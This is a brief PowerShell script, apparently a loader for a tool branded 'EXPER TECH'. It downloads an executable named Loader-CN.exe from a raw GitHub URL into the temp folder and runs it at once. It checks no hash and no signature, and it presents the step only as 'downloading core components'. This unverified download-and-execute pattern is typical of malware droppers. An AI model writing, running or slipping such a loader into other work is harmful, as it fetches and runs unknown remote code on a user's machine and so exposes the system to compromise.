
Write-Host "E X P E R  T E C H" -ForegroundColor Cyan


$Url = "https://raw.githubusercontent.com/zuiaixixibaobei-max/EXPER-Loader/96828c5a0fdc1311e20c85075d91e28209de3507/Loader-CN.exe"
$Path = "$env:TEMP\EXPER_Core.exe"

Write-Host "[>] Downloading core components..." -ForegroundColor Gray
Invoke-WebRequest -Uri $Url -OutFile $Path


Start-Process $Path
